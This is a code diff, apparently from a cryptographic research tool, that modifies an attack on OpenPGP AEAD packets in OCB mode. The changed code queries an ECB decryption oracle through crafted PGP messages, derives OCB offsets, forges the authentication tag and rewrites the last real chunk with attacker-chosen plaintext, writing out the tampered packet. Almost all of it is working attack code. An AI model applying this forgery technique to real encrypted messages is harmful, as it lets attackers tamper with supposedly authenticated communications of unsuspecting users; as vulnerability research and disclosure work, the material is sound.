@@ -314,12 +314,12 @@ const cipher_block_t<AES_BLOCK_SIZE> offset0_from_nonce(uint32_t iter,
     L_computer l_computer(encrypted_zero_block);
 
     aead_packet_t mod_aead_packet(aead_packet);
-    auto stripped_chunks = aead_packet.aead_chunks();
-    stripped_chunks.pop_back();
-    stripped_chunks.pop_back();
-    mod_aead_packet.set_chunks(stripped_chunks);
+    //auto stripped_chunks = aead_packet.aead_chunks();
+    /*stripped_chunks.pop_back();
+    stripped_chunks.pop_back();*/
+    //mod_aead_packet.set_chunks(stripped_chunks);
 
-    std::vector<uint8_t> add_data_final_mod = determine_add_data_for_chunk(mod_aead_packet, 0, true);
+    std::vector<uint8_t> add_data_final_mod = determine_add_data_for_chunk(mod_aead_packet, mod_aead_packet.aead_chunks().size()-1, false);
 
     std::cout << std::format("add_data_final_mod  = {}\n", Botan::hex_encode(add_data_final_mod));
 
@@ -420,7 +420,7 @@ const cipher_block_t<AES_BLOCK_SIZE> offset0_from_nonce(uint32_t iter,
     {
         S_xor_sum ^= block;
     }
-    cipher_block_t<AES_BLOCK_SIZE> new_final_tag = S_xor_sum; // = HASH(K, A)
+    cipher_block_t<AES_BLOCK_SIZE> new_final_real_chunk_tag = S_xor_sum; // = HASH(K, A)
     
     std::cout << std::format("OCB hash result = {}\n", S_xor_sum.hex());
 
@@ -437,39 +437,66 @@ const cipher_block_t<AES_BLOCK_SIZE> offset0_from_nonce(uint32_t iter,
         throw Exception("IV too small for OCB");
     }
     // xor the chunk-idx into the IV
-    uint8_t new_final_chunk_idx = static_cast<uint8_t>(mod_aead_packet.aead_chunks().size());
+    uint8_t new_final_chunk_idx = static_cast<uint8_t>(mod_aead_packet.aead_chunks().size() - 1);
 
     nonce[14] ^= new_final_chunk_idx;
-    std::cout << "nonce for tag computation of final empty chunk: " << Botan::hex_encode(nonce) << std::endl;
+    std::cout << "nonce for tag computation of final real chunk: " << Botan::hex_encode(nonce) << std::endl;
 
+    std::array<uint8_t, AES_BLOCK_SIZE> aes_block_filled_with_whitespace = { 0x20 };
+    cipher_block_t<AES_BLOCK_SIZE> new_pt_block_ws(aes_block_filled_with_whitespace);
+    cipher_block_vec_t<AES_BLOCK_SIZE> new_chunk_ct;
 
     cipher_block_t<AES_BLOCK_SIZE> G_0 = offset0_from_nonce(
         iter, ctl, vec_ct, pkesk, session_key, decr_params, msg_file_path, nonce.data(), nonce.size());
     std::cout << std::format("G_0 for encryption: {}\n", G_0.hex());
-    cipher_block_t<AES_BLOCK_SIZE> F0_xor_Ldollar(l_computer.dollar());
-    F0_xor_Ldollar ^= G_0;
+    cipher_block_t<AES_BLOCK_SIZE> Gn_xor_Ldollar(l_computer.dollar());
+    Gn_xor_Ldollar ^= G_0;
 
-    cipher_block_vec_t<AES_BLOCK_SIZE> ct_F0_Ldollar;
-    ct_F0_Ldollar.push_back(F0_xor_Ldollar);
+    cipher_block_vec_t<AES_BLOCK_SIZE> Pi_xor_Gi;
+    cipher_block_t<AES_BLOCK_SIZE> G_i = G_0;
+    cipher_block_t<AES_BLOCK_SIZE> s_i; // the plaintext xor-sum s_0 = 0...0
+    size_t i = 1;
+    while(Pi_xor_Gi.size() * AES_BLOCK_SIZE < aead_packet.chunk_size()) // build the block sequence of the {P_i ⊕ G_i} for input to the decryption oracle
+    {
+        cipher_block_t<AES_BLOCK_SIZE> L_ntz_i = l_computer.get(ctz(i));
+        G_i ^= L_ntz_i;
+        Pi_xor_Gi.push_back(new_pt_block_ws ^ G_i);
+        s_i ^= new_pt_block_ws;
+        i++;
+    }
+     
 
-    cipher_block_vec_t<AES_BLOCK_SIZE> ecb_encr_F0_xor_Ldollar_block_from_oracle =
+    cipher_block_vec_t<AES_BLOCK_SIZE> ct_for_oracle; // n = 0 for now
+    std::cout << std::format("plaintext sum s_n = {}\n", s_i.hex());
+    ct_for_oracle.push_back(Gn_xor_Ldollar ^ s_i);
+
+    ct_for_oracle.insert(ct_for_oracle.end(), Pi_xor_Gi.begin(), Pi_xor_Gi.end());
+
+    cipher_block_vec_t<AES_BLOCK_SIZE> ecb_encrypted_oracle_ct =
         invoke_ecb_opgp_decr(std::format("{}-ocb-remove-chunk-att-F0_xor_Ldollar-query-pgp-msg", iter),
                              ctl,
                              vec_ct,
-                             ct_F0_Ldollar,
+                             ct_for_oracle, // s_0 = 0...0, thus it's absent
                              pkesk,
                              decr_params,
                              session_key,
                              msg_file_path);
-    if (ecb_encr_F0_xor_Ldollar_block_from_oracle.size() != 1)
+    if (ecb_encrypted_oracle_ct.size() != 1 + Pi_xor_Gi.size())
     {
-        throw Exception(std::format("unexptected block count of {} for oracle decryption result for F0_xor_Ldollar",
-                                    ecb_encr_F0_xor_Ldollar_block_from_oracle.size()));
+        throw Exception(std::format("unexptected block count of {} for oracle decryption result for oracle decryption result",
+                                    ecb_encrypted_oracle_ct.size()));
     }
-    new_final_tag ^= ecb_encr_F0_xor_Ldollar_block_from_oracle[0];
-    std::cout << "new final tag of final empty chunk computed in attack: " << Botan::hex_encode(new_final_tag) << std::endl;
+    new_final_real_chunk_tag ^= ecb_encrypted_oracle_ct[0];
+    std::cout << "new final tag of final real chunk computed in attack: " << Botan::hex_encode(new_final_real_chunk_tag) << std::endl;
 
-    mod_aead_packet.set_final_auth_tag(new_final_tag.to_uint8_vec());
+    ecb_encrypted_oracle_ct.erase(ecb_encrypted_oracle_ct.begin()); // now it is the ciphertext
+    aead_chunk_t new_last_real_chunk;
+    new_last_real_chunk.auth_tag = new_final_real_chunk_tag.to_uint8_vec();
+    new_last_real_chunk.encrypted = ecb_encrypted_oracle_ct.serialize();
+
+    mod_aead_packet.rewrite_chunk(new_last_real_chunk, mod_aead_packet.aead_chunks().size() - 1);
+
+    mod_aead_packet.set_final_auth_tag(new_final_real_chunk_tag.to_uint8_vec());
     auto encoded_mod_aead_packet = mod_aead_packet.get_encoded();
     ctl.potentially_write_run_time_file(encoded_mod_aead_packet,
                                         std::format("{}-aead-packet-with-final-chunk-removed", iter));
